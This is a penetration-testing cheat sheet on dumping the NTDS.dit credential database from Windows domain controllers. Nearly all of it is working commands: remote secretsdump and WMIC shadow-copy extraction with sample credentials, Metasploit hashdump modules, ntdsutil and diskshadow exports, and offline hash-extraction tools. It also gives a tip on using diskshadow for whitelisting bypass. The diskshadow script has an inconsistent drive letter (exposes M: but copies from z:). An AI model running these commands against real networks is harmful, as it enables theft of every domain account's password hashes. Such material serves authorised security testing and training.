# Dump the domain \(Domain Controllers\)

## Remote Access

### Secretsdump.py

```text
secretsdump -just-dc-ntlm -user-status -o [out_file] [Domain]/[User]@[IP] 
```

### WMIC & NTDSutil

from: [https://adsecurity.org/?p=2398](https://adsecurity.org/?p=2398)

```bash
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"
copy \\10.0.0.1\c$\temp\ntds.dit C:\temp
copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp
```

### Metasploit

```bash
auxiliary/admin/smb/psexec_ntdsgrab
windows/gather/credentials/domain_hashdump
```

## Local Access

### NTDSutil

Windows binary allows for export of ntds.dit

```text
ntdsutil "activate instance ntds" "ifm" "create full c:\windows\temp\" "quit" "quit"
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\Pentest' quit quit"
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\Pentest' q q"
```

This can then be extracted using secretsdump.py and registry hashes

```text
secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
```

Alternatively, additional information can be included such as if accounts are active:

```text
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit  -o ntdis-extract -user-status LOCAL
```

Then the output can be filtered to remove both disabled and machine accounts:

```text
grep -i "enabled" <secetsdump.py_output.txt> | grep -v "\\$" | sed -e 's! (status=Enabled)!!' $1 > output-filtered.txt
```

### Diskshadow

From Windows server 2008 and later, can use "diskshadow.exe" to copy NTDS.dit.

Create an instruction set for diskshadow.exe to create a new shadow disk copy of the disk C and expose it as drive M:\

{% code title="shadow.txt" %}
```bash
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% M:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit
delete shadows volume %someAlias%
reset
```
{% endcode %}

Then run:

```bash
mkdir c:\temp
diskshadow.exe /s [Path]\shadow.txt  #Needs to be run from System32
```

Side note: diskshadow can be utilised for whitelisting bypass and process tree obfuscation using the "exec" function.

## Extracting from NTDS.dit

Secretsdump.py as described above, or any of the following tools

```bash
ntdsdecode
NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive
./adXtract.sh ./ntds.dit ./SYSTEM.hive
```



